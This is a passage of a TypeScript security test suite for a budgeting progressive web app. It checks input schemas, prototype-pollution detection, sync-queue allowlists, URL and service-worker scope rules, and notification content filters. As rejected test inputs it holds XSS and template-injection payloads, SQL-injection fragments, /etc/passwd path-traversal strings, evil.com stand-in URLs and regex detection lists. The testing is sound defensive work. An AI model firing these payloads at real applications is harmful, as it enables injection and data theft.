      
      // MUST fail validation
      expect(result.success).toBe(false);
      const errors = result.error as { issues: unknown[] };
      expect(errors.issues.length).toBeGreaterThanOrEqual(2);
    });

    it('should REJECT data with wrong types', () => {
      const wrongTypeData = {
        month_id: 123, // Should be string
        title: ['array', 'not', 'string'], // Should be string
        category_key: 'essenciais',
        value: 'not-a-number', // Should be number
      };

      const result = CreateExpenseInputSchema.safeParse(wrongTypeData);
      
      expect(result.success).toBe(false);
      const errors2 = result.error as { issues: unknown[] };
      expect(errors2.issues.length).toBeGreaterThanOrEqual(2);
    });

    it('should handle corrupted JSON gracefully', () => {
      const corruptedPatterns = [
        '{"incomplete":', // Incomplete JSON
        'not-json-at-all',
        '{"key": undefined}', // Invalid JSON value
        '',
        null,
      ];

      corruptedPatterns.forEach(pattern => {
        if (typeof pattern === 'string' && pattern.length > 0) {
          // Parsing should throw, not crash
          expect(() => {
            try {
              JSON.parse(pattern);
            } catch {
              // Expected - invalid JSON
            }
          }).not.toThrow();
        }
      });
    });
  });

  describe('Store name validation', () => {
    it('should REJECT prototype pollution store names', () => {
      const reservedWords = ['__proto__', 'constructor', 'prototype'];
      const validPattern = /^[a-z_]+$/;

      const isValidStoreName = (name: string): boolean => {
        return validPattern.test(name) && !reservedWords.includes(name);
      };

      // Valid store names
      expect(isValidStoreName('families')).toBe(true);
      expect(isValidStoreName('sync_queue')).toBe(true);
      expect(isValidStoreName('expenses')).toBe(true);

      // Reserved words MUST be rejected
      reservedWords.forEach(word => {
        expect(isValidStoreName(word)).toBe(false);
      });

      // Malicious names MUST be rejected
      expect(isValidStoreName('../families')).toBe(false);
      expect(isValidStoreName('families; DROP')).toBe(false);
      expect(isValidStoreName('<script>')).toBe(false);
    });
  });

  describe('Offline ID format enforcement', () => {
    const OFFLINE_ID_PATTERN = /^(offline|family|exp|month|goal|rec|sub|gentry)-\d+-[a-z0-9]+$/;

    it('should ACCEPT valid offline IDs', () => {
      const validIds = [
        'offline-1704067200000-abc123',
        'exp-1704067200000-def456',
        'month-1704067200000-ghi789',
        'goal-1704067200000-jkl012',
      ];

      validIds.forEach(id => {
        expect(OFFLINE_ID_PATTERN.test(id)).toBe(true);
      });
    });

    it('should REJECT ALL malicious offline IDs', () => {
      const maliciousIds = [
        'offline-<script>-alert',
        '__proto__-1234-abc',
        'constructor-1234-xyz',
        'offline-NaN-test',
        'offline-Infinity-test',
        'offline--1-negative',
        'family-../../../etc/passwd',
        'exp-; DROP TABLE-abc',
        'month-123-${inject}',
        'goal-123-{{template}}',
      ];

      maliciousIds.forEach(id => {
        expect(OFFLINE_ID_PATTERN.test(id)).toBe(false);
      });
    });

    it('should REJECT IDs via secureStorage validation', () => {
      const maliciousIds = [
        '__proto__',
        'constructor',
        '<script>alert(1)</script>',
        '../../../etc/passwd',
      ];

      maliciousIds.forEach(id => {
        expect(setSecureStorageItem('current-family-id', id)).toBe(false);
      });
    });
  });
});

describe('Security - PWA Sync Queue Protection', () => {
  const VALID_SYNC_TYPES = [
    'family', 'month', 'expense', 'recurring_expense',
    'subcategory', 'category_limit', 'family_member',
    'income_source', 'goal', 'goal_entry',
  ];
  const VALID_SYNC_ACTIONS = ['insert', 'update', 'delete'];

  describe('Sync queue entry validation', () => {
    it('should ACCEPT only valid sync queue types', () => {
      const isValidType = (type: string): boolean => VALID_SYNC_TYPES.includes(type);

      // Valid types MUST pass
      VALID_SYNC_TYPES.forEach(type => {
        expect(isValidType(type)).toBe(true);
      });

      // Invalid types MUST fail
      const invalidTypes = ['admin', '__proto__', 'constructor', 'prototype', 'system', 'root'];
      invalidTypes.forEach(type => {
        expect(isValidType(type)).toBe(false);
      });
    });

    it('should ACCEPT only valid sync queue actions', () => {
      const isValidAction = (action: string): boolean => VALID_SYNC_ACTIONS.includes(action);

      // Valid actions MUST pass
      VALID_SYNC_ACTIONS.forEach(action => {
        expect(isValidAction(action)).toBe(true);
      });

      // Invalid actions MUST fail
      const invalidActions = ['drop', 'truncate', 'escalate', '__proto__', 'exec', 'eval'];
      invalidActions.forEach(action => {
        expect(isValidAction(action)).toBe(false);
      });
    });

    it('should VALIDATE complete sync queue item structure', () => {
      interface SyncQueueItem {
        id: string;
        type: string;
        action: string;
        data: Record<string, unknown>;
        createdAt: string;
        familyId: string;
      }

      const isValidSyncItem = (item: Partial<SyncQueueItem>): boolean => {
        // All required fields must exist
        if (!item.id || !item.type || !item.action || !item.data || !item.createdAt || !item.familyId) {
          return false;
        }
        // Type and action must be valid
        if (!VALID_SYNC_TYPES.includes(item.type) || !VALID_SYNC_ACTIONS.includes(item.action)) {
          return false;
        }
        // CreatedAt must be valid date
        if (isNaN(new Date(item.createdAt).getTime())) {
          return false;
        }
        return true;
      };

      // Valid item MUST pass
      const validItem = {
        id: 'sync-123',
        type: 'expense',
        action: 'insert',
        data: { title: 'Coffee', value: 5 },
        createdAt: '2025-01-01T00:00:00Z',
        familyId: 'family-123',
      };
      expect(isValidSyncItem(validItem)).toBe(true);

      // Invalid items MUST fail
      expect(isValidSyncItem({ id: 'sync-1', type: 'expense' })).toBe(false); // Missing fields
      expect(isValidSyncItem({ ...validItem, type: '__proto__' })).toBe(false); // Invalid type
      expect(isValidSyncItem({ ...validItem, action: 'drop' })).toBe(false); // Invalid action
      expect(isValidSyncItem({ ...validItem, createdAt: 'invalid' })).toBe(false); // Invalid date
    });

    it('should DETECT prototype pollution in sync data', () => {
      // When __proto__ is set in an object literal, it doesn't show in Object.keys
      // We need to use Object.getOwnPropertyNames or check hasOwnProperty
      const pollutedDataViaDefine: Record<string, unknown> = {};
      Object.defineProperty(pollutedDataViaDefine, '__proto__', {
        value: { admin: true },
        enumerable: true,
        writable: true,
        configurable: true,
      });

      // Detect prototype pollution attempt in data
      const hasProtoPollution = (obj: Record<string, unknown>): boolean => {
        // Check for dangerous keys using multiple methods
        const allKeys = Object.getOwnPropertyNames(obj);
        return allKeys.some(key => 
          key === '__proto__' || key === 'constructor' || key === 'prototype'
        );
      };

      expect(hasProtoPollution(pollutedDataViaDefine)).toBe(true);
      
      // Also test constructor pollution
      const constructorPolluted: Record<string, unknown> = { constructor: { isAdmin: true } };
      expect(hasProtoPollution(constructorPolluted)).toBe(true);
    });
  });

  describe('Sync queue data sanitization', () => {
    it('should not allow familyId spoofing in sync data', () => {
      const syncItem = {
        type: 'expense',
        action: 'insert',
        data: {
          family_id: 'victim-family-id', // Attempted spoofing
          title: 'Malicious expense',
          value: 9999999,
        },
        familyId: 'attacker-family-id', // Actual family ID
      };

      // The familyId in sync item metadata should be trusted, not data.family_id
      expect(syncItem.data.family_id).not.toBe(syncItem.familyId);
      // Server should use familyId from metadata, not from data
    });

    it('should reject sync items with mismatched timestamps', () => {
      const futureDate = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString();
      const ancientDate = '1970-01-01T00:00:00Z';

      const suspiciousItems = [
        { createdAt: futureDate }, // Far future
        { createdAt: ancientDate }, // Unix epoch
        { createdAt: 'invalid-date' }, // Invalid format
        { createdAt: 'NaN' }, // NaN string
      ];

      suspiciousItems.forEach(item => {
        const date = new Date(item.createdAt);
        const now = Date.now();
        const oneYearAgo = now - 365 * 24 * 60 * 60 * 1000;
        const oneHourFromNow = now + 60 * 60 * 1000;

        const isValidTimestamp = !isNaN(date.getTime()) && 
                                  date.getTime() > oneYearAgo && 
                                  date.getTime() < oneHourFromNow;

        // All suspicious timestamps should fail validation
        expect(isValidTimestamp).toBe(false);
      });
    });
  });
});

describe('Security - PWA Storage Quota Protection', () => {
  describe('Storage abuse prevention', () => {
    it('should enforce size limits via Zod validation', () => {
      const MAX_TITLE_LENGTH = 255;

      // Attempt to store oversized data
      const oversizedTitle = 'A'.repeat(MAX_TITLE_LENGTH + 100);
      
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: oversizedTitle,
        category_key: 'essenciais',
        value: 100,
      });

      // MUST be rejected
      expect(result.success).toBe(false);
      const err = result.error as { issues: { path: string[] }[] };
      expect(err.issues[0].path).toContain('title');
    });

    it('should enforce reasonable limits for all text fields', () => {
      const testCases = [
        { field: 'title', maxLength: 255, schema: CreateExpenseInputSchema,
          base: { month_id: 'm-1', category_key: 'essenciais', value: 1 } },
        { field: 'name', maxLength: 255, schema: CreateSubcategoryInputSchema,
          base: { category_key: 'essenciais' } },
        { field: 'name', maxLength: 255, schema: CreateIncomeSourceInputSchema,
          base: { value: 1000 } },
      ];

      testCases.forEach(({ field, maxLength, schema, base }) => {
        // At max length - should PASS
        const validPayload = { ...base, [field]: 'A'.repeat(maxLength) };
        const validResult = schema.safeParse(validPayload);
        expect(validResult.success).toBe(true);

        // Over max length - should FAIL
        const invalidPayload = { ...base, [field]: 'A'.repeat(maxLength + 1) };
        const invalidResult = schema.safeParse(invalidPayload);
        expect(invalidResult.success).toBe(false);
      });
    });

    it('should reject sync queue flood via validation', () => {
      const VALID_SYNC_TYPES = [
        'family', 'month', 'expense', 'recurring_expense',
        'subcategory', 'goal', 'goal_entry', 'income_source',
      ];
      const VALID_SYNC_ACTIONS = ['insert', 'update', 'delete'];

      // Create a validator function
      const isValidSyncItem = (item: { type: string; action: string }): boolean => {
        return VALID_SYNC_TYPES.includes(item.type) && 
               VALID_SYNC_ACTIONS.includes(item.action);
      };

      // Valid items
      expect(isValidSyncItem({ type: 'expense', action: 'insert' })).toBe(true);
      expect(isValidSyncItem({ type: 'goal', action: 'update' })).toBe(true);

      // Attack attempts - invalid types/actions MUST be rejected
      expect(isValidSyncItem({ type: 'admin', action: 'escalate' })).toBe(false);
      expect(isValidSyncItem({ type: '__proto__', action: 'pollute' })).toBe(false);
      expect(isValidSyncItem({ type: 'expense', action: 'drop' })).toBe(false);
      expect(isValidSyncItem({ type: 'constructor', action: 'insert' })).toBe(false);
    });

    it('should enforce numeric limits to prevent overflow attacks', () => {
      // Test value limits
      const testCases = [
        { value: Number.MAX_SAFE_INTEGER + 1, shouldFail: false }, // Still finite
        { value: Infinity, shouldFail: true },
        { value: -Infinity, shouldFail: true },
        { value: NaN, shouldFail: true },
        { value: -1, shouldFail: true }, // Negative expense
      ];

      testCases.forEach(({ value, shouldFail }) => {
        const result = CreateExpenseInputSchema.safeParse({
          month_id: 'month-123',
          title: 'Test',
          category_key: 'essenciais',
          value,
        });

        if (shouldFail) {
          expect(result.success).toBe(false);
        } else {
          expect(result.success).toBe(true);
        }
      });
    });
  });
});

describe('Security - PWA Origin and Scope Validation', () => {
  describe('Manifest scope security', () => {
    it('should REJECT URLs outside scope', () => {
      const isDangerousUrl = (url: string): boolean => {
        return url.startsWith('javascript:') ||
               url.startsWith('data:') ||
               url.startsWith('file:') ||
               url.startsWith('//') ||
               (url.startsWith('http') && !url.includes('budget-app.com'));
      };

      const dangerousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>',
        'file:///etc/passwd',
        '//evil.com/steal',
        'https://evil.com/',
      ];

      dangerousUrls.forEach(url => {
        expect(isDangerousUrl(url)).toBe(true);
      });
    });

    it('should ACCEPT only relative safe URLs', () => {
      const isSafeRelativeUrl = (url: string): boolean => {
        // REJECT protocol-relative URLs (//evil.com)
        if (url.startsWith('//')) return false;
        // Safe if relative path without protocol and no path traversal
        return (url.startsWith('/') || url.startsWith('.') || !url.includes(':')) &&
               !url.includes('..');
      };

      const safeUrls = ['/', '/budget', '/goals', './assets/icon.png'];
      const unsafeUrls = ['../../../etc/passwd', 'javascript:alert(1)', '//evil.com'];

      safeUrls.forEach(url => {
        expect(isSafeRelativeUrl(url)).toBe(true);
      });

      unsafeUrls.forEach(url => {
        expect(isSafeRelativeUrl(url)).toBe(false);
      });
    });

    it('should REJECT navigation to external origins via URL parsing', () => {
      const appOrigin = 'https://budget-app.com';
      
      const externalUrls = [
        'https://phishing-site.com/login',
        'https://evil.com/steal-credentials',
        'http://insecure-site.com/',
      ];

      externalUrls.forEach(urlString => {
        const url = new URL(urlString);
        expect(url.origin).not.toBe(appOrigin);
      });
    });
  });

  describe('Deep link parameter sanitization', () => {
    it('should DETECT malicious patterns in URL parameters', () => {
      const suspiciousPatterns = [
        /<script/i,
        /javascript:/i,
        /__proto__/i,
        /constructor/i,
        /DROP\s+TABLE/i,
        /eval\s*\(/i,
      ];

      const isSuspicious = (value: string): boolean => {
        return suspiciousPatterns.some(pattern => pattern.test(value));
      };

      // All these MUST be detected as suspicious
      expect(isSuspicious('<script>alert(1)</script>')).toBe(true);
      expect(isSuspicious('javascript:alert(1)')).toBe(true);
      expect(isSuspicious('{"__proto__":{"admin":true}}')).toBe(true);
      expect(isSuspicious("'; DROP TABLE users;--")).toBe(true);
      expect(isSuspicious('eval(malicious)')).toBe(true);

      // Safe values should NOT be flagged
      expect(isSuspicious('normal-value')).toBe(false);
      expect(isSuspicious('12345')).toBe(false);
    });
  });
});

describe('Security - PWA Update Integrity', () => {
  describe('Resource integrity validation', () => {
    it('should DETECT hash mismatch (tampered resources)', () => {
      const expectedHashes: Record<string, string> = {
        '/app.js': 'sha384-abc123',
        '/styles.css': 'sha384-def456',
        '/index.html': 'sha384-ghi789',
      };

      const verifyIntegrity = (url: string, actualHash: string): boolean => {
        const expectedHash = expectedHashes[url];
        return expectedHash === actualHash;
      };

      // Valid resources
      expect(verifyIntegrity('/app.js', 'sha384-abc123')).toBe(true);
      expect(verifyIntegrity('/styles.css', 'sha384-def456')).toBe(true);

      // Tampered resources MUST fail
      expect(verifyIntegrity('/app.js', 'sha384-TAMPERED')).toBe(false);
      expect(verifyIntegrity('/styles.css', 'sha384-MODIFIED')).toBe(false);
      expect(verifyIntegrity('/unknown.js', 'sha384-xyz')).toBe(false);
    });

    it('should REJECT invalid service worker scopes', () => {
      const isValidScope = (scope: string): boolean => {
        // Valid: relative paths without dangerous patterns
        const isDangerous = scope.includes('..') ||
                           scope.includes(':') ||
                           scope.startsWith('//');
        const isRelative = scope.startsWith('/') || scope.startsWith('.');
        return isRelative && !isDangerous;
      };

      // Valid scopes
      expect(isValidScope('/')).toBe(true);
      expect(isValidScope('/app/')).toBe(true);
      expect(isValidScope('./')).toBe(true);

      // Invalid scopes MUST be rejected
      expect(isValidScope('https://evil.com/')).toBe(false);
      expect(isValidScope('../../../')).toBe(false);
      expect(isValidScope('file:///')).toBe(false);
      expect(isValidScope('javascript:')).toBe(false);
    });
  });

  describe('Background sync security', () => {
    it('should ONLY accept valid sync tag names', () => {
      const SYNC_TAG_PATTERN = /^[a-z][a-z0-9-]*$/;

      const validTags = ['sync-expenses', 'sync-goals', 'background-sync', 'data-sync-v2'];
      const invalidTags = [
        '<script>alert(1)</script>',
        'javascript:void(0)',
        '__proto__',
        '../../../etc/passwd',
        'UPPERCASE-TAG',
        'tag with spaces',
        '',
      ];

      validTags.forEach(tag => {
        expect(SYNC_TAG_PATTERN.test(tag)).toBe(true);
      });

      invalidTags.forEach(tag => {
        expect(SYNC_TAG_PATTERN.test(tag)).toBe(false);
      });
    });

    it('should enforce maximum sync retry limit', () => {
      const MAX_SYNC_RETRIES = 5;
      
      const shouldRetry = (attempts: number): boolean => {
        return attempts < MAX_SYNC_RETRIES;
      };

      // Should allow retries under limit
      expect(shouldRetry(0)).toBe(true);
      expect(shouldRetry(4)).toBe(true);

      // MUST stop at limit
      expect(shouldRetry(5)).toBe(false);
      expect(shouldRetry(10)).toBe(false);
      expect(shouldRetry(100)).toBe(false);
    });
  });
});

describe('Security - PWA Notification Security', () => {
  describe('Notification content validation', () => {
    it('should DETECT and REJECT malicious notification content', () => {
      const MALICIOUS_PATTERNS = [
        /<script/i,
        /onerror\s*=/i,
        /onload\s*=/i,
        /javascript:/i,
        /\{\{.*constructor/i,
        /eval\s*\(/i,
      ];

      const isMaliciousContent = (content: string): boolean => {
        return MALICIOUS_PATTERNS.some(pattern => pattern.test(content));
      };

      // Malicious content MUST be detected
      expect(isMaliciousContent('<script>alert(1)</script>')).toBe(true);
      expect(isMaliciousContent('<img src=x onerror=alert(1)>')).toBe(true);
      expect(isMaliciousContent('{{constructor.constructor("alert")()}}')).toBe(true);
      expect(isMaliciousContent('javascript:alert(1)')).toBe(true);

      // Safe content should pass
      expect(isMaliciousContent('New expense added!')).toBe(false);
      expect(isMaliciousContent('Budget updated successfully')).toBe(false);
    });

    it('should VALIDATE notification action URLs are safe', () => {
      const isSafeActionUrl = (url: string | undefined): boolean => {
        if (!url) return true; // No URL is safe
        // Must be relative path, no protocol
        return url.startsWith('/') && 
               !url.includes(':') && 
               !url.includes('..');
      };

      // Safe URLs
      expect(isSafeActionUrl(undefined)).toBe(true);
      expect(isSafeActionUrl('/budget')).toBe(true);
      expect(isSafeActionUrl('/goals/123')).toBe(true);

      // Dangerous URLs MUST be rejected
      expect(isSafeActionUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeActionUrl('https://phishing.com/login')).toBe(false);
      expect(isSafeActionUrl('file:///etc/passwd')).toBe(false);
      expect(isSafeActionUrl('/../../../etc/passwd')).toBe(false);
    });
  });
});

describe('Security - PWA Installation Attack Prevention', () => {
  describe('Install prompt validation', () => {
    it('should ONLY trust browser-generated install prompts', () => {
      const isValidInstallPrompt = (event: { isTrusted: boolean; type: string }): boolean => {
        return event.isTrusted && event.type === 'beforeinstallprompt';
      };

      // Valid browser event
      expect(isValidInstallPrompt({ isTrusted: true, type: 'beforeinstallprompt' })).toBe(true);

      // Spoofed events MUST be rejected
      expect(isValidInstallPrompt({ isTrusted: false, type: 'beforeinstallprompt' })).toBe(false);
      expect(isValidInstallPrompt({ isTrusted: true, type: 'fake-event' })).toBe(false);
      expect(isValidInstallPrompt({ isTrusted: false, type: 'fake-event' })).toBe(false);
    });
  });

  describe('Manifest integrity', () => {
    it('should VERIFY manifest matches expected app identity', () => {
      const expectedApp = {
        id: '/',
        origin: 'https://budget-app.com',
      };

      const isValidManifest = (manifest: { id?: string; start_url: string; scope: string }): boolean => {
        // ID must match
        if (manifest.id && manifest.id !== expectedApp.id) return false;
        // URLs must not point to external origins
        if (manifest.start_url.includes('evil') || manifest.scope.includes('evil')) return false;
        return true;
      };

      // Valid manifest
      expect(isValidManifest({ id: '/', start_url: '/', scope: '/' })).toBe(true);

      // Malicious manifests MUST be rejected
      expect(isValidManifest({ id: 'wrong-id', start_url: '/', scope: '/' })).toBe(false);
      expect(isValidManifest({ id: '/', start_url: 'https://evil.com/', scope: '/' })).toBe(false);
      expect(isValidManifest({ id: '/', start_url: '/', scope: 'https://evil.com/' })).toBe(false);
    });
  });
});
